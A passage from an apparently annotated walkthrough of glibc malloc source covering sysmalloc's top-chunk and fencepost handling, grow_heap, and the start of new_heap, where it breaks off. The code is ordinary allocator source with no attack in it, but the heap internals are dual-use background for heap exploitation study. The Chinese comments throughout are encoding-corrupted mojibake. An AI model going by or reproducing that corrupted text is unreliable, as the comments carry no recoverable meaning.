            // å‡å» MINSIZE å¾—åˆ°åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´ï¼Œé¦–å…ˆè®¾ç½® fencepost çš„ç¬¬äºŒä¸ª chunk çš„ size
            // ä¸º 0ï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ã€‚æ¥ç€åˆ¤æ–­åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´ä¸Šæ˜¯å¦å¤§
            // äºç­‰äº MINSIZEï¼Œå¦‚æœæ˜¯ï¼Œè¡¨ç¤ºåŸ top chunk å¯ä»¥åˆ†é…å‡ºå¤§äºç­‰äº MINSIZE å¤§å°çš„ chunkï¼Œäº
            // æ˜¯å°†åŸ top chunk åˆ‡åˆ†æˆç©ºé—² chunk å’Œ fencepost ä¸¤éƒ¨åˆ†ï¼Œå…ˆè®¾ç½® fencepost çš„ç¬¬ä¸€ä¸ª chunk
            // çš„å¤§å°ä¸º 2*SIZE_SZï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œfencepost çš„ç¬¬ä¸€ä¸ª chunk è¿˜éœ€
            // è¦è®¾ç½® footï¼Œè¡¨ç¤ºè¯¥ chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œè€Œ fencepost çš„ç¬¬äºŒä¸ª chunk å´æ ‡è¯†ç¬¬ä¸€ä¸ª chunk
            // å¤„äº inuse çŠ¶æ€ï¼Œå› ä¸ºä¸èƒ½æœ‰ä¸¤ä¸ªç©ºé—² chunk ç›¸é‚»ï¼Œæ‰ä¼šå‡ºç°è¿™ä¹ˆå¥‡æ€ªçš„ fencepostã€‚å¦å¤–å…¶
            // å® top chunk åˆ‡åˆ†å‡ºæ¥çš„ chunk ä¹Ÿæ˜¯å¤„äºç©ºé—²çŠ¶æ€ï¼Œä½† fencepost çš„ç¬¬ä¸€ä¸ª chunk å´æ ‡è¯†å‰ä¸€
            // ä¸ª chunk ä¸º inuse çŠ¶æ€ï¼Œç„¶åå¼ºåˆ¶å°†è¯¥å¤„äº inuse çŠ¶æ€çš„ chunk è°ƒç”¨_int_free()å‡½æ•°é‡Šæ”¾æ‰
            // è¿™æ ·åšå®Œå…¨æ˜¯è¦éµå¾ªä¸èƒ½æœ‰ä¸¤ä¸ªç©ºé—² chunk ç›¸é‚»çš„çº¦å®š
            if (old_size &gt;= MINSIZE)
            {
                set_head (chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);
                set_foot (chunk_at_offset(old_top, old_size), (2 * SIZE_SZ));
                set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
                _int_free(av, old_top, 1);
            }
            // å¦‚æœåŸ top chunk ä¸­æœ‰æ•ˆç©ºé—´ä¸è¶³ MINSIZEï¼Œåˆ™å°†æ•´ä¸ªåŸ top chunk ä½œä¸º fencepostï¼Œ
            // å¹¶è®¾ç½® fencepost çš„ç¬¬ä¸€ä¸ª chunk çš„ç›¸å…³çŠ¶æ€
            else
            {
                set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);
                set_foot (old_top, (old_size + 2 * SIZE_SZ));
            }
        }
        // å¦‚æœå¢é•¿ sub_heap çš„å¯è¯»å¯å†™åŒºåŸŸå¤§å°å’Œåˆ›å»ºæ–° sub_heap éƒ½å¤±è´¥äº†ï¼Œ
        // å°è¯•ä½¿ç”¨ mmap() å‡½æ•°ç›´æ¥ä»ç³»ç»Ÿåˆ†é…æ‰€éœ€ chunk
        else if (!tried_mmap)
            /* We can at least try to use to mmap memory.  */
            goto try_mmap;
    } else     /* av == main_arena */
    // å¦‚æœå½“å‰åˆ†é…åŒºä¸ºä¸»åˆ†é…åŒº

    { /* Request enough space for nb + pad + overhead */
        size = nb + mp_.top_pad + MINSIZE;

        /*
           If contiguous, we can subtract out existing space that we hope to
           combine with new space. We add it back later only if
           we don&#39;t actually get contiguous space.
         */
        // ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸»åˆ†é…åŒºä½¿ç”¨ sbrk()ä» heap ä¸­åˆ†é…å†…å­˜ï¼Œsbrk()è¿”å›è¿ç»­çš„è™šæ‹Ÿå†…å­˜ï¼Œ
        // è¿™é‡Œè°ƒæ•´éœ€è¦åˆ†é…çš„ sizeï¼Œå‡æ‰ top chunk ä¸­å·²æœ‰ç©ºé—²å†…å­˜å¤§å°
        if (contiguous (av))
            size -= old_size;

        /*
           Round to a multiple of page size.
           If MORECORE is not contiguous, this ensures that we only call it
           with whole-page arguments.  And if MORECORE is contiguous and
           this is not first time through, this preserves page-alignment of
           previous calls. Otherwise, we correct to page-align below.
         */
        //  å°† size æŒ‰ç…§é¡µå¯¹é½ï¼Œsbrk()å¿…é¡»ä»¥é¡µä¸ºå•ä½åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜
        size = ALIGN_UP(size, pagesize);

        /*
           Don&#39;t try to call MORECORE if argument is so big as to appear
           negative. Note that since mmap takes size_t arg, it may succeed
           below even if we cannot call MORECORE.
         */
        // ä½¿ç”¨ sbrk()ä» heap ä¸­åˆ†é… size å¤§å°çš„è™šæ‹Ÿå†…å­˜å—
        if (size &gt; 0) {
            brk = (char *) (MORECORE(size));
            LIBC_PROBE(memory_sbrk_more, 2, brk, size);
        }
        // å¦‚æœ sbrk()åˆ†é…æˆåŠŸï¼Œå¹¶ä¸” morecore çš„ hook å‡½æ•°å­˜åœ¨ï¼Œè°ƒç”¨ morecore çš„ hook å‡½æ•°
        if (brk != (char *) (MORECORE_FAILURE)) {
            /* Call the `morecore&#39; hook if necessary.  */
            void (*hook)(void) = atomic_forced_read(__after_morecore_hook);
            if (__builtin_expect(hook != NULL, 0))
                (*hook)();
        } else {
            /*
               If have mmap, try using it as a backup when MORECORE fails or
               cannot be used. This is worth doing on systems that have &quot;holes&quot; in
               address space, so sbrk cannot extend to give contiguous space, but
               space is available elsewhere.  Note that we ignore mmap max count
               and threshold limits, since the space will not be used as a
               segregated mmap region.
             */
            // å¦‚æœ sbrk()è¿”å›å¤±è´¥ï¼Œæˆ–æ˜¯ sbrk()ä¸å¯ç”¨ï¼Œä½¿ç”¨ mmap()ä»£æ›¿ï¼Œé‡æ–°è®¡ç®—æ‰€éœ€åˆ†é…çš„å†…å­˜
            // å¤§å°å¹¶æŒ‰é¡µå¯¹é½ï¼Œå¦‚æœé‡æ–°è®¡ç®—çš„ size å°äº 1Mï¼Œå°† size è®¾ä¸º 1Mï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨ mmap()
            // ä½œä¸º morecore å‡½æ•°åˆ†é…çš„æœ€å°å†…å­˜å—å¤§å°ä¸º 1M
            /* Cannot merge with old top, so add its size back in */
            if (contiguous (av))
                size = ALIGN_UP(size + old_size, pagesize);

            /* If we are relying on mmap as backup, then use larger units */
            if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE))
                size = MMAP_AS_MORECORE_SIZE;

            /* Don&#39;t try if size wraps around 0 */
            // å¦‚æœæ‰€éœ€åˆ†é…çš„å†…å­˜å¤§å°åˆæ³•ï¼Œä½¿ç”¨ mmap()å‡½æ•°åˆ†é…å†…å­˜ã€‚å¦‚æœåˆ†é…æˆåŠŸï¼Œæ›´æ–° brk
            // å’Œ snd_brkï¼Œå¹¶å°†å½“å‰åˆ†é…åŒºå±æ€§è®¾ç½®ä¸ºå¯åˆ†é…ä¸è¿ç»­è™šæ‹Ÿå†…å­˜å—
              if ((unsigned long) (size) &gt; (unsigned long) (nb)) {
                  char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));

                  if (mbrk != MAP_FAILED) {
                      /* We do not need, and cannot use, another sbrk call to find end */
                    brk = mbrk;
                    snd_brk = brk + size;

                    /*
                       Record that we no longer have a contiguous sbrk region.
                       After the first time mmap is used as backup, we do not
                       ever rely on contiguous space since this could incorrectly
                       bridge regions.
                     */
                    set_noncontiguous (av);
                }
            }
        }
        //å¦‚æœbrkåˆæ³•ï¼Œå³sbrk()æˆ–mmap()åˆ†é…æˆåŠŸï¼Œå¦‚æœsbrk_baseè¿˜æ²¡æœ‰åˆå§‹åŒ–ï¼Œ
        //æ›´æ–° sbrk_base å’Œå½“å‰åˆ†é…åŒºçš„å†…å­˜åˆ†é…æ€»é‡
        if (brk != (char *) (MORECORE_FAILURE)) {
            if (mp_.sbrk_base == 0)
                mp_.sbrk_base = brk;
            av-&gt;system_mem += size;

            /*
               If MORECORE extends previous space, we can likewise extend top size.
             */
            // å¦‚æœ sbrk()åˆ†é…æˆåŠŸï¼Œæ›´æ–° top chunk çš„å¤§å°ï¼Œå¹¶è®¾å®š top chunk çš„å‰ä¸€ä¸ª chunk å¤„äº inuse
            // çŠ¶æ€ã€‚å¦‚æœå½“å‰åˆ†é…åŒºå¯åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜ï¼ŒåŸ top chunk çš„å¤§å°å¤§äº 0ï¼Œä½†æ–°çš„ brk å€¼å°
            // äºåŸ top chunk çš„ç»“æŸåœ°å€ï¼Œåˆ™å‡ºé”™äº†
            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))
                set_head (old_top, (size + old_size) | PREV_INUSE);

            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)
                /* Oops!  Someone else killed our space..  Can&#39;t touch anything.  */
                malloc_printerr(&quot;break adjusted to free malloc space&quot;);

                /*
                   Otherwise, make adjustments:

                 * If the first time through or noncontiguous, we need to call sbrk
                    just to find out where the end of memory lies.

                 * We need to ensure that all returned chunks from malloc will meet
                    MALLOC_ALIGNMENT

                 * If there was an intervening foreign sbrk, we need to adjust sbrk
                    request size to account for fact that we will not be able to
                    combine new space with existing space in old_top.

                 * Almost all systems internally allocate whole pages at a time, in
                    which case we might as well use the whole last page of request.
                    So we allocate enough more memory to hit a page boundary now,
                    which in turn causes future contiguous calls to page-align.
                 */
            // æ‰§è¡Œåˆ°è¿™ä¸ªåˆ†æ”¯ï¼Œæ„å‘³ç€ sbrk()è¿”å›çš„ brk å€¼å¤§äºåŸ top chunk çš„ç»“æŸåœ°å€ï¼Œ
            // é‚£ä¹ˆæ–°çš„åœ°å€ä¸åŸ top chunk çš„åœ°å€ä¸è¿ç»­ï¼Œå¯èƒ½æ˜¯ç”±äºå¤–éƒ¨å…¶å®ƒåœ°æ–¹è°ƒç”¨ sbrk()å‡½æ•°ï¼Œ
            // è¿™é‡Œéœ€è¦å¤„ç†åœ°å€çš„é‡æ–°å¯¹é½é—®é¢˜
            else {

                front_misalign = 0;
                end_misalign = 0;
                correction = 0;
                aligned_brk = brk;

                /* handle contiguous cases */
                if (contiguous (av)) {
                    /* Count foreign sbrk as system_mem.  */
                    // å¦‚æœæœ¬åˆ†é…åŒºå¯åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜ï¼Œå¹¶ä¸”æœ‰å¤–éƒ¨è°ƒç”¨äº† sbrk()å‡½æ•°ï¼Œ
                    // å°†å¤–éƒ¨è°ƒç”¨ sbrk()åˆ†é…çš„å†…å­˜è®¡å…¥å½“å‰åˆ†é…åŒºæ‰€åˆ†é…å†…å­˜ç»Ÿè®¡ä¸­
                    if (old_size)
                        av-&gt;system_mem += brk - old_end;

                    /* Guarantee alignment of first new chunk made from this space */
                    //  è®¡ç®—å½“å‰çš„ brk è¦çŸ«æ­£çš„å­—èŠ‚æ•°æ®ï¼Œä¿è¯ brk åœ°å€æŒ‰ MALLOC_ALIGNMENT å¯¹é½
                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;
                    if (front_misalign &gt; 0) {
                        /*
                           Skip over some bytes to arrive at an aligned position.
                           We don&#39;t need to specially mark these wasted front bytes.
                           They will never be accessed anyway because
                           prev_inuse of av-&gt;top (and any chunk created from its start)
                           is always true after initialization.
                         */

                        correction = MALLOC_ALIGNMENT - front_misalign;
                        aligned_brk += correction;
                    }

                    /*
                       If this isn&#39;t adjacent to existing space, then we will not
                       be able to merge with old_top space, so must add to 2nd request.
                     */
                    // ç”±äºåŸ top chunk çš„åœ°å€ä¸å½“å‰ brk ä¸ç›¸é‚»ï¼Œä¹Ÿå°±ä¸èƒ½å†ä½¿ç”¨åŸ top chunk çš„å†…å­˜äº†ï¼Œéœ€
                    // è¦é‡æ–°ä¸ºæ‰€éœ€ chunk åˆ†é…è¶³å¤Ÿçš„å†…å­˜ï¼Œå°†åŸ top chunk çš„å¤§å°åŠ åˆ°çŸ«æ­£å€¼ä¸­ï¼Œä»å½“å‰ brk ä¸­
                    // åˆ†é…æ‰€éœ€ chunkï¼Œè®¡ç®—å‡ºæœªå¯¹é½çš„ chunk ç»“æŸåœ°å€ end_misalignï¼Œç„¶åå°† end_misalign æŒ‰ç…§
                    // é¡µå¯¹é½è®¡ç®—å‡ºéœ€è¦çŸ«æ­£çš„å­—èŠ‚æ•°åŠ åˆ°çŸ«æ­£å€¼ä¸Šã€‚ç„¶åå†è°ƒç”¨ sbrk()åˆ†é…çŸ«æ­£å€¼å¤§å°çš„å†…å­˜ï¼Œ
                    // å¦‚æœ sbrk()åˆ†é…æˆåŠŸï¼Œåˆ™å½“å‰çš„ top chunk ä¸­å¯ä»¥åˆ†é…å‡ºæ‰€éœ€çš„è¿ç»­å†…å­˜çš„ chunk
                    correction += old_size;

                    /* Extend the end address to hit a page boundary */
                    end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);
                    correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;

                    assert(correction &gt;= 0);
                    snd_brk = (char *) (MORECORE(correction));

                    /*
                       If can&#39;t allocate correction, try to at least find out current
                       brk.  It might be enough to proceed without failing.

                       Note that if second sbrk did NOT fail, we assume that space
                       is contiguous with first sbrk. This is a safe assumption unless
                       program is multithreaded but doesn&#39;t use locks and a foreign sbrk
                       occurred between our first and second calls.
                     */
                    // å¦‚æœ sbrk()æ‰§è¡Œå¤±è´¥ï¼Œæ›´æ–°å½“å‰ brk çš„ç»“æŸåœ°å€
                    if (snd_brk == (char *) (MORECORE_FAILURE)) {
                        correction = 0;
                        snd_brk = (char *) (MORECORE(0));
                    }
                    // å¦‚æœ sbrk()æ‰§è¡ŒæˆåŠŸï¼Œå¹¶ä¸”æœ‰ morecore hook å‡½æ•°å­˜åœ¨ï¼Œæ‰§è¡Œè¯¥ hook å‡½æ•°
                    else {
                        /* Call the `morecore&#39; hook if necessary.  */
                        void (*hook)(void) = atomic_forced_read(__after_morecore_hook);
                        if (__builtin_expect(hook != NULL, 0))
                            (*hook)();
                    }
                }

                    /* handle non-contiguous cases */
                // æ‰§è¡Œåˆ°è¿™é‡Œï¼Œæ„å‘³ç€ brk æ˜¯ç”¨ mmap()åˆ†é…çš„
                else {
                    if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)
                        /* MORECORE/mmap must correctly align */
                        assert(((unsigned long) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == 0);
                    // å¯¹é½æ“ä½œ
                    else {
                        front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;
                        if (front_misalign &gt; 0) {
                            /*
                               Skip over some bytes to arrive at an aligned position.
                               We don&#39;t need to specially mark these wasted front bytes.
                               They will never be accessed anyway because
                               prev_inuse of av-&gt;top (and any chunk created from its start)
                               is always true after initialization.
                             */

                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;
                        }
                    }

                    /* Find out current end of memory */
                    // å¦‚æœ brk çš„ç»“æŸåœ°å€éæ³•ï¼Œä½¿ç”¨ morecore è·å¾—å½“å‰ brk çš„ç»“æŸåœ°å€
                    if (snd_brk == (char *) (MORECORE_FAILURE)) {
                        snd_brk = (char *) (MORECORE(0));
                    }
                }

                /* Adjust top based on results of second sbrk */
                // å¦‚æœ brk çš„ç»“æŸåœ°å€åˆæ³•ï¼Œè®¾ç½®å½“å‰åˆ†é…åŒºçš„ top chunk ä¸º brkï¼Œ
                // è®¾ç½® top chunk çš„å¤§å°ï¼Œå¹¶æ›´æ–°åˆ†é…åŒºçš„æ€»åˆ†é…å†…å­˜é‡
                if (snd_brk != (char *) (MORECORE_FAILURE)) {
                    av-&gt;top = (mchunkptr) aligned_brk;
                    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);
                    av-&gt;system_mem += correction;

                    /*
                       If not the first time through, we either have a
                       gap due to foreign sbrk or a non-contiguous region.  Insert a
                       double fencepost at old_top to prevent consolidation with space
                       we don&#39;t own. These fenceposts are artificial chunks that are
                       marked as inuse and are in any case too small to use.  We need
                       two to make sizes and alignments work out.
                     */
                    // è®¾ç½®åŸ top chunk çš„ fencepostï¼Œfencepost éœ€è¦ MINSIZE å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå°†è¯¥ old_size
                    // å‡å» MINSIZE å¾—åˆ°åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿¡åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´
                    // ä¸€å®šå¤§äº MINSIZEï¼Œå°†åŸ top chunk åˆ‡åˆ†æˆç©ºé—² chunk å’Œ fencepost ä¸¤éƒ¨åˆ†ï¼Œé¦–å…ˆè®¾ç½®åˆ‡åˆ†å‡º
                    // æ¥çš„ chunk çš„å¤§å°ä¸º old_sizeï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼ŒåŸ top chunk åˆ‡åˆ†å‡ºæ¥
                    // çš„chunkæœ¬åº”å¤„äºç©ºé—²çŠ¶æ€ï¼Œä½†fencepostçš„ç¬¬ä¸€ä¸ªchunkå´æ ‡è¯†å‰ä¸€ä¸ªchunkä¸ºinuseçŠ¶æ€ï¼Œ
                    // ç„¶åå¼ºåˆ¶å°†è¯¥å¤„äº inuse çŠ¶æ€çš„ chunk è°ƒç”¨_int_free()å‡½æ•°é‡Šæ”¾æ‰ã€‚ç„¶åè®¾ç½® fencepost çš„ç¬¬
                    // ä¸€ä¸ª chunk çš„å¤§å°ä¸º 2*SIZE_SZï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œç„¶åè®¾ç½® fencepost
                    // çš„ç¬¬äºŒä¸ª chunk çš„ size ä¸º 2*SIZE_SZï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ã€‚è¿™é‡Œçš„ä¸»åˆ†é…åŒº
                    // çš„ fencepost ä¸éä¸»åˆ†é…åŒºçš„ fencepost ä¸åŒï¼Œä¸»åˆ†é…åŒº fencepost çš„ç¬¬äºŒä¸ª chunk çš„å¤§å°è®¾
                    // ç½®ä¸º 2*SIZE_SZï¼Œè€Œéä¸»åˆ†é…åŒºçš„ fencepost çš„ç¬¬äºŒä¸ª chunk çš„å¤§å°è®¾ç½®ä¸º 0
                    if (old_size != 0) {
                        /*
                           Shrink old_top to insert fenceposts, keeping size a
                           multiple of MALLOC_ALIGNMENT. We know there is at least
                           enough space in old_top to do this.
                         */
                        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;
                        set_head (old_top, old_size | PREV_INUSE);

                        /*
                           Note that the following assignments completely overwrite
                           old_top when old_size was previously MINSIZE.  This is
                           intentional. We need the fencepost, even if old_top otherwise gets
                           lost.
                         */
                        set_head (chunk_at_offset(old_top, old_size),
                                  (2 * SIZE_SZ) | PREV_INUSE);
                        set_head (chunk_at_offset(old_top, old_size + 2 * SIZE_SZ),
                                  (2 * SIZE_SZ) | PREV_INUSE);

                        /* If possible, release the rest. */
                        if (old_size &gt;= MINSIZE)
                        {
                            _int_free(av, old_top, 1);
                        }
                    }
                }
            }
        }
    } /* if (av !=  &amp;main_arena) */
    // å¦‚æœå½“å‰åˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜é‡å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ï¼Œæ›´æ–°å½“å‰åˆ†é…åŒºæœ€å¤§åˆ†é…çš„å†…å­˜é‡
    if ((unsigned long) av-&gt;system_mem &gt; (unsigned long) (av-&gt;max_system_mem))
        av-&gt;max_system_mem = av-&gt;system_mem;
    check_malloc_state (av);

    /* finally, do the allocation */
    p = av-&gt;top;
    size = chunksize (p);

    /* check that one of the above allocation paths succeeded */
    // å¦‚æœå½“å‰ top chunk ä¸­å·²ç»æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥åˆ†é…æ‰€éœ€çš„ chunkï¼Œ
    // ä»å½“å‰çš„ top chunk ä¸­åˆ†é…æ‰€éœ€çš„ chunk å¹¶è¿”å›
    if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
    {
        remainder_size = size - nb;
        remainder = chunk_at_offset (p, nb);
        av-&gt;top = remainder;
        set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
        set_head (remainder, remainder_size | PREV_INUSE);
        check_malloced_chunk (av, p, nb);
        return chunk2mem (p);
    }

    /* catch all failure paths */
    __set_errno(ENOMEM);
    return 0;
}
</code></pre>
<h4 id="grow-heap"><a href="#grow-heap" class="headerlink" title="grow_heap"></a>grow_heap</h4><pre><code class="c">static int grow_heap (heap_info *h, long diff)
{
  size_t pagesize = GLRO (dl_pagesize);
  long new_size;

  diff = ALIGN_UP (diff, pagesize);
  new_size = (long) h-&gt;size + diff;
  if ((unsigned long) new_size &gt; (unsigned long) HEAP_MAX_SIZE)
    return -1;

  if ((unsigned long) new_size &gt; h-&gt;mprotect_size)
    {
      if (__mprotect ((char *) h + h-&gt;mprotect_size,
                      (unsigned long) new_size - h-&gt;mprotect_size,
                      PROT_READ | PROT_WRITE) != 0)
        return -2;

      h-&gt;mprotect_size = new_size;
    }

  h-&gt;size = new_size;
  LIBC_PROBE (memory_heap_more, 2, h, h-&gt;size);
  return 0;
}
</code></pre>
<h4 id="new-heap"><a href="#new-heap" class="headerlink" title="new_heap"></a>new_heap</h4><pre><code class="c">static heap_info *new_heap (size_t size, size_t top_pad)
{
  size_t pagesize = GLRO (dl_pagesize);
  char *p1, *p2;
  unsigned long ul;
  heap_info *h;

  /* è°ƒæ•´ size çš„å¤§å°ï¼Œsize çš„æœ€å°å€¼ä¸º 32K,æœ€å¤§å€¼ HEAP_MAX_SIZE åœ¨ä¸åŒ */
  /* çš„ç³»ç»Ÿä¸Šä¸åŒï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸º 1Mï¼Œ64 ä½ç³»ç»Ÿä¸º 64Mï¼Œå°† size çš„å¤§å°è°ƒ */
  /* æ•´åˆ°æœ€å°å€¼ä¸æœ€å¤§å€¼ä¹‹é—´ï¼Œå¹¶ä»¥é¡µå¯¹é½ï¼Œå¦‚æœ size å¤§äºæœ€å¤§å€¼ï¼Œç›´æ¥æŠ¥é”™ */
  if (size + top_pad &lt; HEAP_MIN_SIZE)
    size = HEAP_MIN_SIZE;
  else if (size + top_pad &lt;= HEAP_MAX_SIZE)
    size += top_pad;
  else if (size &gt; HEAP_MAX_SIZE)
    return 0;
  else
    size = HEAP_MAX_SIZE;
  size = ALIGN_UP (size, pagesize);

  /* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.
     No swap space needs to be reserved for the following large
     mapping (on Linux, this is the case for all non-writable mappings
     anyway). */
  /* å…¨å±€å˜é‡ aligned_heap_area æ˜¯ä¸Šä¸€æ¬¡è°ƒç”¨ mmap åˆ†é…å†…å­˜çš„ç»“æŸè™šæ‹Ÿåœ°å€ï¼Œå¹¶å·²ç»æŒ‰ */
  /* ç…§ HEAP_MAX_SIZE å¤§å°å¯¹é½ã€‚å¦‚æœ aligned_heap_area ä¸ä¸ºç©ºï¼Œå°è¯•ä»ä¸Šæ¬¡æ˜ å°„ç»“æŸ */
  /* åœ°å€å¼€å§‹æ˜ å°„å¤§å°ä¸º HEAP_MAX_SIZE çš„å†…å­˜å—ï¼Œç”±äºå…¨å±€å˜é‡ aligned_heap_area æ²¡ */
  /* æœ‰é”ä¿æŠ¤ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶ mmap()å‡½æ•°ä» aligned_heap_area å¼€å§‹æ˜ å°„æ–°çš„è™šæ‹Ÿ */
  /* å†…å­˜å—ï¼Œæ“ä½œç³»ç»Ÿä¼šä¿è¯åªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæˆåŠŸï¼Œå…¶å®ƒåœ¨åŒä¸€åœ°å€æ˜ å°„æ–°è™šæ‹Ÿå†…å­˜å—éƒ½ä¼šå¤±è´¥ã€‚*/
  /* æ— è®ºæ˜ å°„æ˜¯å¦æˆåŠŸï¼Œéƒ½å°†å…¨å±€å˜é‡ aligned_heap_area è®¾ç½®ä¸º NULLã€‚å¦‚æœæ˜ å°„æˆåŠŸï¼Œä½† */
  /* è¿”å›çš„è™šæ‹Ÿåœ°å€ä¸æ˜¯æŒ‰ HEAP_MAX_SIZE å¤§å°å¯¹é½çš„ï¼Œå–æ¶ˆè¯¥åŒºåŸŸçš„æ˜ å°„ï¼Œæ˜ å°„å¤±è´¥ */
  p2 = MAP_FAILED;
  if (aligned_heap_area)
    {
      p2 = (char *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,
                          MAP_NORESERVE);
      aligned_heap_area = NULL;
      if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)))
        {
          __munmap (p2, HEAP_MAX_SIZE);
          p2 = MAP_FAILED;
        }
    }

  /* å…¨å±€å˜é‡ aligned_heap_area æ˜¯ä¸Šä¸€æ¬¡è°ƒç”¨ mmap åˆ†é…å†…å­˜çš„ç»“æŸè™šæ‹Ÿåœ°å€ï¼Œå¹¶å·²ç»æŒ‰ */
  /* ç…§ HEAP_MAX_SIZE å¤§å°å¯¹é½ã€‚å¦‚æœ aligned_heap_area ä¸ä¸ºç©ºï¼Œå°è¯•ä»ä¸Šæ¬¡æ˜ å°„ç»“æŸ */  
  /* åœ°å€å¼€å§‹æ˜ å°„å¤§å°ä¸º HEAP_MAX_SIZE çš„å†…å­˜å—ï¼Œç”±äºå…¨å±€å˜é‡ aligned_heap_area æ²¡æœ‰é”ä¿æŠ¤ï¼Œå¯
èƒ½å­˜åœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶ mmap()å‡½æ•°ä» aligned_heap_area å¼€å§‹æ˜ å°„æ–°çš„è™šæ‹Ÿå†…å­˜å—ï¼Œæ“ä½œç³»ç»Ÿ
ä¼šä¿è¯åªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæˆåŠŸï¼Œå…¶å®ƒåœ¨åŒä¸€åœ°å€æ˜ å°„æ–°è™šæ‹Ÿå†…å­˜å—éƒ½ä¼šå¤±è´¥ã€‚æ— è®ºæ˜ å°„æ˜¯å¦
æˆåŠŸï¼Œéƒ½å°†å…¨å±€å˜é‡ aligned_heap_area è®¾ç½®ä¸º NULLã€‚å¦‚æœæ˜ å°„æˆåŠŸï¼Œä½†è¿”å›çš„è™šæ‹Ÿåœ°å€ä¸
æ˜¯æŒ‰ HEAP_MAX_SIZE å¤§å°å¯¹é½çš„ï¼Œå–æ¶ˆè¯¥åŒºåŸŸçš„æ˜ å°„ï¼Œæ˜ å°„å¤±è´¥ã€‚*/
  if (p2 == MAP_FAILED)
    {
      p1 = (char *) MMAP (0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE);

      /* æ˜ å°„ 2 å€ HEAP_MAX_SIZE å¤§å°çš„è™šæ‹Ÿå†…å­˜æˆåŠŸï¼Œå°†å¤§äºç­‰äº p1 å¹¶æŒ‰ HEAP_MAX_SIZE */
      /* å¤§å°å¯¹é½çš„ç¬¬ä¸€ä¸ªè™šæ‹Ÿåœ°å€èµ‹å€¼ç»™ p2ï¼Œp2 ä½œä¸º sub_heap çš„èµ·å§‹è™šæ‹Ÿåœ°å€ï¼Œp2+HEAP_MAX_SIZE */
      /* ä½œä¸º sub_heap çš„ç»“æŸåœ°å€ï¼Œå¹¶å°† sub_heap çš„ç»“æŸåœ°å€èµ‹å€¼ç»™å…¨å±€å˜é‡aligned_heap_areaï¼Œ*/
      /* æœ€åè¿˜éœ€è¦å°†å¤šä½™çš„è™šæ‹Ÿå†…å­˜è¿˜å›ç»™æ“ä½œç³»ç»Ÿ */
      if (p1 != MAP_FAILED)
        {
          p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1))
                         &amp; ~(HEAP_MAX_SIZE - 1));
          ul = p2 - p1;
          if (ul)
            __munmap (p1, ul);
          else
            aligned_heap_area = p2 + HEAP_MAX_SIZE;
          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);
        }
      else
        {
          /* Try to take the chance that an allocation of only HEAP_MAX_SIZE
             is already aligned. */
          /* æ˜ å°„ 2 å€ HEAP_MAX_SIZE å¤§å°çš„è™šæ‹Ÿå†…å­˜å¤±è´¥äº†ï¼Œå†å°è¯•æ˜ å°„ HEAP_MAX_SIZE */
          /* å¤§å°çš„è™šæ‹Ÿå†…å­˜ï¼Œå¦‚æœå¤±è´¥ï¼Œè¿”å›ï¼›å¦‚æœæˆåŠŸï¼Œä½†è¯¥è™šæ‹Ÿåœ°å€ä¸æ˜¯æŒ‰ç…§ HEAP_MAX_SIZE */
          /* å¤§å°å¯¹é½çš„ï¼Œè¿”å› */
          p2 = (char *) MMAP (0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);
